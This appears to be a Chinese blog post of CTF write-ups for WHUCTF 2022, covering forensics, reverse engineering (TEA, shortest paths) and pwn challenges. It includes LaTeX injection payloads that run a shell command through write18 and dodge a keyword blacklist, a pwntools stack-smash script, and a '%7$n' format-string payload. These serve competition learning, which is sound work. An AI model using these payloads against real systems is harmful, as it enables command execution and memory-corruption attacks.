---
title: WHUCTF 2022 部分题解
date: 2022-04-10 18:59:45
tags:
- ctf
- debugging
- assembly
- php
mathjax: true
---

今年有幸参与`WHUCTF`出题，贡献了一道`MISC`和一道`REVERSE`

<!--more-->

周六去打别的比赛了，没赶上开赛...

反正两天忙里偷闲做了几题

题解完成情况：

- [ ] MISC

  - [x] REAL SIGN IN
  - [x] 好宅呀我都不看这些的
  - [x] eldroW
  - [x] Rubber
  - [ ] secretplayer
- [ ] Reverse

  - [x] signin_2048

  - [x] Sleeeeeeeeeeeeeeeeeeep

  - [ ] MMMc

  - [x] Way

  - [ ] ~~pe_format~~ 没放出来的题
- [ ] Pwn

  - [x] ssp
  - [x] fmt
  - [ ] armRop
  - [ ] Brainfork
- [ ] Blockchain
- [ ] Web
- [ ] Crypto （~~我要是会数论昨天的蓝桥杯就不至于心态崩了~~）

## MISC

### REAL SIGN IN

`BASE64`解码直接出`flag`：`whuctf{WelCome_t0_the_W0rld_of_CTF}`

### 好宅呀我都不看这些的

题目`zip`解压后发现`Eva终.MP4`，`file`查询可知该文件为`rar`压缩

解压后发现触动灵魂的`ccd.pcapng`和`flag.pyc`，这玩意不是去年华为武研119的题目？

<img src="misc1-1.png" alt="misc1-1" style="zoom:80%;" />

迄今为止还记得那个`flag.pyc`存在隐写没发现....

现在正经的做这题：

首先拿`flag.pyc`开刀，使用[stegosaurus](https://github.com/AngelKitty/stegosaurus)处理`pyc`中的隐写

![misc1-2](misc1-2.png)

需要注意的是这个工具需要在`Python 3.6`中运行，我在`3.9`中会出现错误

我们得到了`flag`的前半段`flag{6754997a`

然后处理`ccd.pcapng`

首先用文件->导出对象->HTTP导出所有`HTTP`通信的文件

首先看`1.php`：一个中规中矩的`PHP Shell`，返回的数据使用`7c8087`作为开始符，`160394d3a42`作为结束符

然后逐个分析，`1(1).php`返回了目录信息，`1(2).php`中更换了`Shell`，起始符变为`8d89130c2`，结束符变为`a889274`

接下来比较重要的是`1(3).php`，这是一个`rar`文件，手动去除首位标记解压后得到了`password.txt`密码表

`1(4).php`中更换了`Shell`，起始符变为`f87e9`，结束符变为`e9671e4cc6`

`1(5).php`是一个`zip`文件，其中有密码保护，通过之前的密码表，使用`Advanced Archive Password Recovery`或者类似的软件爆破可以得到密码：`duome438caodan!&^demima`

![misc1-3](misc1-3.png)

我们得到了一个`gif`然而这个`gif`无法直接打开

从`Wikipeida`上我们可以得到`GIF`文件的格式：文件头 + 逻辑屏幕描述符 + 颜色表 + ...

注意到：`The series of sub-blocks is terminated by an empty sub-block (a 0 byte).`

也就是意味着文件内应该存在大量的`0x00`而文件结尾是由`0xFF`组成的，怀疑文件内容对`0xFF`做了差，写一个脚本进行转换：

```python
f = open('pic1.gif', 'rb')
f1 = open('pic2.gif', 'wb')
f1.write(bytes(map(lambda x: 255 - x, list(f.read()))))
f1.close()
f.close()
```

得到了`pic2.gif`，但是文件头不对

![misc1-4](misc1-4.png)

手动改成`GIF87a`

![misc1-5](misc1-5.png)

得到了可以打开的`GIF`文件

使用`stegsolve`等工具逐帧分析可以得到后半段`flag`：`44ofd5f4}`

本题的`flag`：`flag{6754997a44ofd5f4}`

### eldroW

Wordle + 脚本编写

[3Blue1Brown - Solving Wordle using information theory](https://www.3blue1brown.com/lessons/wordle)

（话说昨晚跑脚本把服务器跑崩了，成功发现了服务端的`Bug` :smile:

### Rubber

本人出的题，去年刷`FB`的是否发现了有关`LaTex Injection`的内容，于是想着在新生赛出一个相关题目。本来考虑做更多的变式，比如说从环境变量读取`FLAG`之类的，但是感觉较难遂放弃了，最后是往`flag`里面添加了一些会改变格式的字符来稍稍增加难度

但是，从做题的情况来看，实属不理想（我还给了多个`Hint`...）
验题的时候我把题目给了两个同班同学，他们都能够看出生成的文档是由$\LaTeX$ 生成的，并且能猜测出$\LaTeX$命令执行的考点，唯一难点在于主观性的认为代码是由`lstlisting`生成，所以我在题面内加入了相关指示

#### 做题情况分析

最后只有一支队做出了...

**这就是 C T F**

![misc2-1](misc2-1.png)

最后`30s`成功拿到`flag`

两天时间总共收到了`302`发提交，其中有：

1. `7`发提交猜测`lstlisting`
2. `34`发提交成功猜测出了代码片段使用的是`minted`宏包
3. `46`发提交尝试构造了执行命令的`payload`
4. 剩下的包含但不限于
   1. 一位语言过于激烈的选手（`fxxk`）
   2. `1`次尝试`node.js`的提交
   3. `3`次尝试`XSS`的提交
   4. `5`次很认真的想写`Python`代码的提交
   5. 超过一百发提交：`print('hello world')`

在平台上总共收到了`28`次`flag`提交，其中有：

1. `1`发`Catch the flag`
2. `3`发提交`flag`格式
3. `4`发提交成功的获取到了`Shell`执行权限但是把临时文件（夹）的名字当成`flag`交了
4. `6`发提交过滤后的`REPLACED`
5. 剩下的在猜测`flag`

从简单的统计数据中来看，只有$\frac{46}{302}\approx 15\%$的提交是真正看懂了题意并尝试解答

总结一下：大一新生可能没有接触过$\LaTeX$，验题时样本偏差较大.... （唯一做出来的队还是大三的）

#### flag

```text
WHUCTF{La$eX^1n_Jec$i0n-JmgCaHnLoKQfsC135zwK}
```

#### payload

regex ( PHP Side )

在题目页面上，只要稍微尝试写一些`python`代码即可发现存在过滤（最常见的输入`input()`会被替换），所以答题者在构造下面的`payload`时需要注意`fuzz`一下黑名单词汇

```php
$pattern = '/echo|flag|immediate|write18|input/i';
$code = preg_replace($pattern, "REPLACED", $_POST["code"]);
```

payload

这里有一点难度的是需要猜测代码高亮的宏包，多数人可能听过的时`lstlisting`，而题目用的是`minted`（`minted`需要开启`shell escape`选项，刚刚好提供了`shell`执行的能力）

考虑到猜测`minted`可能存在一定的难度，我在题目描述中故意使用了这个词：

> I believe you will be happy with this newly **minted** document.

```latex
\end{minted}

\def\inp{\string\in}
\def\iput{put}
\def\cmdfl{/fl}
\def\cmd{\string{\cmdfl ag\string}}

\newwrite\outfile
\openout\outfile=cmd.tex
\write\outfile{\inp\iput\cmd}
\closeout\outfile

\newread\file
\openin\file=cmd.tex
\loop\unless\ifeof\file
\read\file to\fileline
\fileline
\repeat
\closein\file

\begin{minted}{python}
```

顺便附上解题者的`payload`：他使用了`base64`处理`flag`，很聪明的做法成功绕过了特殊字符解析的问题

```latex
\end{minted}
\def \imm {\string\imme}
\def \diate {diate}
\def \eighteen {\string18}
\def \wwrite {\string\write\eighteen}
\def \fa {fl}
\def \ag {ag}
\def \args {\string{cat /\fa\ag |base64> test.tex\string}}
\def \inp {\string\in}
\def \iput {put}
\def \cmd {\string{test.tex\string}}

% First run
\newwrite\outfile
\openout\outfile=cmd.tex
\write\outfile{\imm\diate\wwrite\args}
\write\outfile{\inp\iput\cmd}
\closeout\outfile

% Second run
\newread\file
\openin\file=cmd.tex
\loop\unless\ifeof\file
    \read\file to\fileline 
    \fileline
\repeat
\closein\file
Run1
\begin{minted}{Python}
```

#### Conversion

1. You may notice that there is no `{` after `WHUCTF`, because it's escaped by $\LaTeX$, you have to append it back
2. Italic characters like `eX1nJec` means that they are surrounded with `$`
3. Superscript and subscript means `^` and `_`

如果采用`base64`编码后偷`flag`，可以跳过这一步

#### Reference

- [freebuf](https://www.freebuf.com/articles/security-management/308191.html)
- [texhack](https://hovav.net/ucsd/dist/texhack.pdf)

### secretplayer [TODO]

给了两个文件`password.jpg`和`flag.zip`，其中`flag.zip`有密码，并且压缩方式为`ZipCrypto Deflate`，基本排除明文攻击

现在分析`password.jpg`发现文件末尾有多余内容：

![misc3-1](misc3-1.png)

提取出来后交给`CyberChef`发现这部分是`UTF-8`编码：

![misc3-2](misc3-2.png)

于是得到了`flag.zip`的密码，解压得到`79352859_p0.png`

检查发现图像末尾没有多余数据，图像放大后能看到规律的白色点阵

=== TODO ===



## Reverse

### signin_2048

`APK`文件拖入`JEB`直接找到`flag`

![RE1-1](RE1-1.png)



### Sleeeeeeeeeeeeeeeeeeep

去花指令并删除反调试后我们可以理清程序的逻辑：

```c
  for ( i = 0; i < 8192 && program[i] != -1; ++i )
  {
    switch ( program[i] )
    {
      case 0u:
        READ_FLAG();
        break;
      case 1u:
        INIT_REGS();
        break;
      case 2u:
        R3_PLUS_R4();
        break;
      case 3u:
        OP1();
        break;
      case 4u:
        OP2();
        break;
      case 5u:
        OP3();
        break;
      case 6u:
        NOP();
        break;
      case 7u:
        CHK();
        break;
      case 8u:
        SUCCESS();
        break;
      case 9u:
        DBG_PRINT();
        break;
      case 0xAu:
        BANNER();
        break;
      case 0xBu:
        BANNER2();
        break;
      case 0xCu:
        RESET();
        break;
      default:
        break;
    }
  }
```

我们可以照此得出虚拟机的程序：

```
RESET

BANNER
READ_FLAG
INIT_REGS
(R3_PLUS_R4 OP1 OP2) * 32
OP3
CHK

NOP

BANNER2
READ_FLAG
INIT_REGS
(R3_PLUS_R4 OP1 OP2) * 32
OP3
CHK

SUCCESS

NOP
```

我们把出现了`32`次的这个结构拿出来看一下：

```c
Regs[3] += Regs[4];
Regs[1] += (Regs[6] + ((unsigned int)Regs[2] >> 5)) ^ (Regs[3] + Regs[2]) ^ (Regs[5] + 16 * Regs[2]);
Regs[2] += (Regs[8] + ((unsigned int)Regs[1] >> 5)) ^ (Regs[3] + Regs[1]) ^ (Regs[7] + 16 * Regs[1]);
```

然后对比一下`TEA`算法的加密过程：

```c
for (i=0; i<32; i++) {
    sum += delta;
    v0 += ((v1<<4) + k0) ^ (v1 + sum) ^ ((v1>>5) + k1);
    v1 += ((v0<<4) + k2) ^ (v0 + sum) ^ ((v0>>5) + k3);
}
```

不难发现虚拟机的`Regs`与`TEA`的关系：

```
sum   -> Regs[3]
delta -> Regs[4]
v0    -> Regs[1]
v1    -> Regs[2]
k0    -> Regs[5]
k1    -> Regs[6]
k2    -> Regs[7]
k3    -> Regs[8]
```

然后从读入和初始化可以看出，程序使用常量`i_want_to_sleep.`和`but_i_study_QWQ.`作为加密密钥，将输入的`flag`切成两半进行加密，与预置的常量进行比对，确认加密后结果是否一致。

从`Wiki`上抄一段`TEA`的解密程序即可，不过需要注意修改程序的常量

```c++
uint32_t delta = 0x61C88646; /* a key schedule constant */

void decrypt(uint32_t v[2], const uint32_t k[4]) {
    uint32_t v0 = v[0], v1 = v[1], sum = delta << 5, i;  /* set up; sum is (delta << 5) & 0xFFFFFFFF */
    uint32_t k0 = k[0], k1 = k[1], k2 = k[2], k3 = k[3]; /* cache key */
    for (i = 0; i < 32; i++) {                           /* basic cycle start */
        v1 -= ((v0 << 4) + k2) ^ (v0 + sum) ^ ((v0 >> 5) + k3);
        v0 -= ((v1 << 4) + k0) ^ (v1 + sum) ^ ((v1 >> 5) + k1);
        sum -= delta;
    } /* end cycle */
    v[0] = v0;
    v[1] = v1;
}

uint32_t key[2][4] = {{0x61775F69, 0x745F746E, 0x6C735F6F, 0x2E706565},
                      {0x5F747562, 0x74735F69, 0x5F796475, 0x2E515751}};
uint32_t enc[3][2] = {{0x0C7F14B5E, 0x0CA8668E0}, {0x0A04A388F, 0x37B5B0B2}, 0};

int main() {

    decrypt(enc[0], key[0]);
    decrypt(enc[1], key[1]);
    printf("%x %x\n", enc[0][0], enc[0][1]);
    printf("%x %x\n", enc[1][0], enc[1][1]);
    printf("%s\n", enc);

    return 0;
}
```

运行输出：

```
61772049 7420746e
6c73206f 706565
I want to sleep
```

根据题目要求，`flag`即为`flag{I_want_to_sleep}`



~~题外话，出这题的师傅一开始放了一个让大家验题的版本，结果程序里用输入的`flag`作为密钥对上面那个常量进行加密.....我周末的时候发现有师傅过了这题，于是重新研究了一下~~



### MMMc [TODO]

一个解魔方的程序



### Way

这题是我出的

#### 题目灵感

2020 ByteCTF "Where are you GOing" ([Docs (feishu.cn)](https://bytectf.feishu.cn/docs/doccnqzpGCWH1hkDf5ljGdjOJYg#hWe696))

原题背景是Dijkstra求最短路，对最短路径与给定数组异或得到`flag`，有意思的地方在于给定的程序求最短路时使用了“睡眠排序”，反向以时间换空间

本题一样是求最短路，给定了一张很“大”的图（`1000000`点，`5000000`边），给出的程序使用`Floyd`求出了最短路。程序给定了一组目标点，由源点到目标点的最短路径即为`flag`中对应字符的`ASCII`

考虑到图中点的数目有`1000000`，`Floyd`复杂度$O(n^3)$，故运算量为$10^{18}$。在出题者的电脑上运行点数目为`4000`的`Floyd`算法用时`42741ms`，故可估算该题使用`Floyd`算法运行需要时间为$\frac{10^{18}}{4000^3}\times4.2\text s\approx6\times10^{6}\text s\approx\frac{6\times10^{6}}{60\times60\times24\times365}\text{year}\approx2\text{year}$

显然，我们没有这么长的时间去运算，所以本题核心在于读懂程序中的算法（`Floyd`最简单的三重循环，即便不借助`F5`应该也能读懂），并且使用其它算法完成最短路的运算（如`Dijkstra`）

其它一些杂项：

1. `fmemopen`函数：把内存映射到`FILE*`上，需查阅资料
2. 花指令：共有两种花指令，出现在三处地方，需要手动去除以便`IDA`分析

#### 题解

直接`IDA`加载并跳转到`main`处

![1](1.png)

发现花指令，空格切换视图并去除花指令

![2](2.png)

简单分析不难发现`loc_1B73`的工作是将`0x1B6B`处`call`指令的返回地址`+1`，所以在`0x1B70`处按`U`取消分析，在`0x1B71`处按`C`转换为`Code`发现该处指令为跳转到`0x1B8C`，所以，批量将`0x1B6B`到`0x1B84`处代码`NOP`

继续向下分析，在`0x1E60`和`0x2070`处还有花指令，如法炮制去除花指令

 接下来直接`F5`对着反编译代码进行分析：

![3](3.png)

首先看`52`行，该函数将`unk_46F0`处开始，长度为`len`的数据转换为`FILE*`以便读入

接下来`53`行开始为快速读入，即读入一个整数，其中`v4`为符号位，`v5`为读取的数字（`69`行）。下方还多次出现此结构，不在赘述

我这里将第一个读入的数记为`num1`，第二个读入的记为`num2`

继续向下看，程序使用`new`动态开了一个二维数组：`long long [num1+5][num1+5]`

![4](4.png)

接下来一段是初始化数组：

![5](5.png)

这里这一长串是编译器做的优化，循环展开 + 利用`xmm`寄存器一次写`128`位。完成之后将刚刚申请的二维数组初始化为了一个很大的数

接下来一个循环（`num2`次），每次读入三个数`u`，`v`，`w`，并记录到二维数组中（241行）

![6](6.png)

完成所有的读入后就是一个经典的三重循环，不难看出，这里是一个`Floyd`算法：

![7](7.png)

写出相应的伪代码：

```c++
for(long long i = 1; i <= num1; ++i)
    for(long long j = 1; j <= num1; ++j)
        for(long long k = 1; k <= num; ++k)
        {
            v40 = v11[j][i] + v11[i][k];
            if(v40 < v11[j][k])
                break;
            v11[j][k] = v40;
        }
```

程序通过了`floyd`算法求出了多源最短路，最后根据最短路信息输出`0x3D`位的`flag`，每一位的`ASCII`值为从`1`号点开始，到`qword_4500`对应点的距离除以`3`

![8](8.png)



程序分析大致如上，现在考虑解这个`flag`：

我们把数据提取出来，`qword_4500`为长`61`位的数组，直接复制出来即可：

```c++
u64 qword_4500[] = {261665,37124,443545,630934,573385,532784,29709,67370,994718,723285,511549,515957,369940,116891,122238,610250,421050,255808,966487,538057,178586,354758,761522,807557,977157,842572,788820,653219,357297,156760,831100,134624,917040,994718,808186,733839,840945,136697,78019,31777,162882,113443,125129,530113,503572,588804,903124,774034,718630,967011,265877,622273,689175,334507,115551,521400,152985,288044,528661,837731,533976}
```

而一开始的输入数据`unk_46F0`我建议直接用`hex editor`：

![9](9.png)

首先考虑求单源最短路，直接使用`Dijkstra`，一个参考的实现如下（补题：[P4779](https://www.luogu.com.cn/problem/P4779)）

```c++
void dijkstra(unsigned n, unsigned s)
{
    for (int i = 1; i <= n; i++)
        dis[i] = u64_MAX >> 1;
    dis[s] = 0;
    q.push({0, s});
    while (!q.empty())
    {
        auto u = q.top().u;
        q.pop();
        if (vis[u])
            continue;
        vis[u] = 1;
        for (auto ed : e[u])
        {
            auto v = ed.v, w = ed.w;
            if (dis[v] > dis[u] + w)
            {
                dis[v] = dis[u] + w;
                q.push({dis[v], v});
            }
        }
    }
}
```

最后，通过`qword_4500`计算`flag`:

```c++
for(int i = 0; i < 61; i++)
    printf("%c", dis[qword_4500[i]] / 3);
```

我们得到了`flag`：`WHUCTF{A1g0R1tHm_1S_FvN_9587FF6F-1D83-437C-BAD8-A46E2F85B24A}`

### ~~pe_format~~

`RE`出多了一道题，本来准备放的，但考虑到`@secsome`大佬把逆向题`AK`了，就不再放出来送分了...

(话说`@secsome`大佬好像还去打了`ACM`新生赛

## Pwn

### ssp

`CTF-Wiki`有很详细的解释，不过多赘述（[花式栈溢出技巧 - CTF Wiki (ctf-wiki.org)](https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/fancy-rop/#stack-smash)）

题目很友好，把`flag`所在的地址给了出来，所以我们只需要一路覆盖到`argv[0]`即可

我们可以采用偷懒的做法，从`1`循环到`128`，看看溢出多少可以覆盖到`argv[0]`

```python
#!/usr/bin/env python3

from pwn import *

exe = ELF("ssp_patched")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("175.178.248.28", 10045)

    return r

def main():
    r = conn()
    r.recvuntil(b'Magic: ')
    magic = int(r.recv(14), 16)
    r.recvuntil(b'size:')
    r.sendline(b'-1')
    r.recvuntil(b'content:')
    r.sendline(p64(magic) * 32)

    r.interactive()


if __name__ == "__main__":
    main()
```

（题外话，本题由于我本地环境的`GLIBC`太新了，默认不打印，所以直接在服务器上枚举尝试 :)

### fmt

[格式化字符串漏洞](https://ctf-wiki.org/pwn/linux/user-mode/fmtstr/fmtstr-intro/)

这个漏洞的总体利用思想是利用`%n`向指定地址写入数据

通过`IDA`逆向可知我们需要操控变量`v4`使得其值大于`1024`

![pwn1-1](pwn1-1.png)

通过`%2048d`我们可以构造出一个输出`2048`长度的串，然后考虑使用`%{offset}$n`来向`v4`地址写入`2048`

我们使用`GDB`进行调试，由于`GDB`在载入程序的时候采用固定地址，这会方便我们的查找

首先我们在`malloc`之后下断点，查看`v4`存储的地址：

![pwn1-2](pwn1-2.png)

可以知道`v4`存储的地址为`0x5555555592a0`

然后，我们在`printf`处下断点，打印进入`printf`后的栈结构，查看上面那个地址在栈里面的偏移

![pwn1-3](pwn1-3.png)

我们通过一个简单的例子来看一下`printf`在`x84-64`下的参数传递过程：

![pwn1-1](pwn1-4.png)

可以发现，除格式化字符串外，前`5`个参数使用寄存器传递，从第`6`个参数开始往栈上存放，所以在上述栈帧结构中，除返回地址外，我们的目标`0x5555555592a0`位于第二个位置，加上前`5`个寄存器传递的参数，可以得出其偏移为`7`

所以构造`payload`：`%2048d%7$n`向目标地址写入数据`2048`，这样就能打印出`flag`了

![pwn1-5](pwn1-5.png)



### armRop [TODO]



### Brainfork [TODO]







